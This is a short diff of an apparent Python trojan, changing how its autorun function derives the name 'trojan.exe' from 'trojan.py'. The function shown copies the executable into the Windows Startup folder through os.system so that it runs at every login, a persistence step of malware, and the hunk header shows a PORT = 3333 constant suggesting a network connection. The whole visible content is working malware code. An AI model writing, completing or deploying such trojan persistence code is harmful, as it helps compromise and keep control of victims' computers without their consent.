@@ -9,7 +9,7 @@ PORT = 3333
 
 def autorun():
     filename = os.path.abspath(__file__)
-    exe_filename = filename.replace(".py", ".exe")
+    exe_filename = filename.replace("trojan.py", "trojan.exe")
     print(filename)
     os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(exe_filename))
 
